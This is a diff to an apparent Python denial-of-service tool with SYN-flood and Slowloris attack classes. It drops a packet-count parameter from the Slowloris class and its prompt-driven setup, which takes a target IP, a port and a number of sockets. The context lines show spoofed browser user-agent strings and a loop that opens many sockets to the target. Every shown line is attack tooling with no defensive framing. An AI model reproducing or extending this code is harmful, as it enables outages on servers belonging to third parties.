@@ -46,10 +46,9 @@ class Synflood:
         self.event.clear()
         
 class Slowloris():
-    def __init__(self, ip, port, pack=50):
+    def __init__(self, ip, port):
         self.target = ip
         self.port = port
-        self.packet = pack
         self.ua = [
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
@@ -93,8 +92,7 @@ if choose == '2':
     ip = input('')
     port = int(input(''))
     sockk = int(input(''))
-    pack = int(input(''))
-    lor = Slowloris(ip, port, pack)
+    lor = Slowloris(ip, port)
     list_of_sockets = []
     for _ in range(sockk):
         try:
